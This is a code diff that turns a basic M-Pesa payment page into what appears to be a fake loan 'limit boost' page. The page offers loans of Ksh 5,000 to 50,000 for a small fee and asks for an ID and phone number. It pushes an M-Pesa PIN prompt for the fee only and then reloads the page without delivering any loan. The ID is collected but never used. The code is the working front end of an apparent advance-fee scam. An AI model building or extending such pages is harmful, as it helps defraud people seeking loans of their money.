@@ -1,27 +1,110 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h2>Pay with M-Pesa</h2>
-    <input type="text" id="phone" placeholder="254712345678">
-    <button onclick="sendMoney()">Pay KES 10</button>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
 
-    <p id="status"></p>
+<script>
+    const loanOptions = [
+      { amount: 5000, fee: 49 }, { amount: 7500, fee: 75 },
+      { amount: 10000, fee: 100 }, { amount: 12500, fee: 120 },
+      { amount: 16000, fee: 150 }, { amount: 21000, fee: 200 },
+      { amount: 25500, fee: 250 }, { amount: 30000, fee: 290 },
+      { amount: 35000, fee: 340 }, { amount: 40000, fee: 410 },
+      { amount: 45000, fee: 480 }, { amount: 50000, fee: 530 }
+    ];
 
-    <script>
-        async function sendMoney() {
-            const phoneNum = document.getElementById('phone').value;
-            document.getElementById('status').innerText = "Sending prompt...";
+    let selectedLoan = null;
+    let phoneNumber = '';
+    let isProcessing = false;
 
-            // This talks to your 'app.py' brain
-            const response = await fetch('/pay', {
-                method: 'POST',
-                
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phoneNum })
-            });
+    const loanGrid = document.getElementById('loan-grid');
+    const getLimitBtn = document.getElementById('get-limit-btn');
 
-            alert("Check your phone for the PIN prompt!");
+    function init() {
+      loanOptions.forEach(loan => {
+        const box = document.createElement('div');
+        box.className = 'loan-box';
+        box.innerHTML = `<div class="amount">Ksh ${loan.amount.toLocaleString()}</div><div class="fee">Fee: Ksh ${loan.fee}</div>`;
+        box.onclick = () => {
+          document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
+          box.classList.add('selected');
+          selectedLoan = loan;
+          getLimitBtn.classList.remove('disabled');
+          getLimitBtn.disabled = false;
+          getLimitBtn.innerHTML = `<i class="fas fa-rocket"></i> Get Ksh ${loan.amount.toLocaleString()} Now`;
+        };
+        loanGrid.appendChild(box);
+      });
+    }
+
+    getLimitBtn.onclick = async () => {
+      const { value: formValues } = await Swal.fire({
+        title: 'Enter Details',
+        html: `
+          <div class="input-wrapper">
+            <label class="input-label">ID Number</label>
+            <input id="swal-id" class="input-field" type="number" placeholder="ID Number">
+          </div>
+          <div class="input-wrapper">
+            <label class="input-label">M-Pesa Number</label>
+            <div class="phone-input-with-prefix">
+              <div class="phone-prefix">+254</div>
+              <input id="swal-phone" class="phone-input-field" type="number" placeholder="712345678">
+            </div>
+          </div>`,
+        showCancelButton: true,
+        confirmButtonText: 'Boost Limit Now',
+        preConfirm: () => {
+          const id = document.getElementById('swal-id').value;
+          const phone = document.getElementById('swal-phone').value;
+          if (!id || phone.length !== 9) {
+            Swal.showValidationMessage('Enter a valid ID and 9-digit phone number');
+            return false;
+          }
+          return { id, phone };
         }
-    </script>
-</body>
-</html>
+      });
+
+      if (formValues) {
+        phoneNumber = "254" + formValues.phone;
+        initiatePayment(formValues.id);
+      }
+    };
+
+    async function initiatePayment(idNumber) {
+      if (isProcessing) return;
+      isProcessing = true;
+      
+      Swal.fire({
+        title: 'Connecting to M-Pesa...',
+        text: 'Please wait for the prompt on your phone',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      try {
+        const response = await fetch('/api/initiate-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone_number: phoneNumber,
+            amount: selectedLoan.fee
+          })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          Swal.fire({
+            icon: 'success',
+            title: 'STK Push Sent!',
+            text: `Enter M-Pesa PIN for Ksh ${selectedLoan.fee} to unlock your Ksh ${selectedLoan.amount.toLocaleString()} limit.`
+          }).then(() => location.reload());
+        } else {
+          throw new Error(result.error || 'Payment failed');
+        }
+      } catch (error) {
+        Swal.fire({ icon: 'error', title: 'Error', text: error.message });
+        isProcessing = false;
+      }
+    }
+
+    init();
+</script>
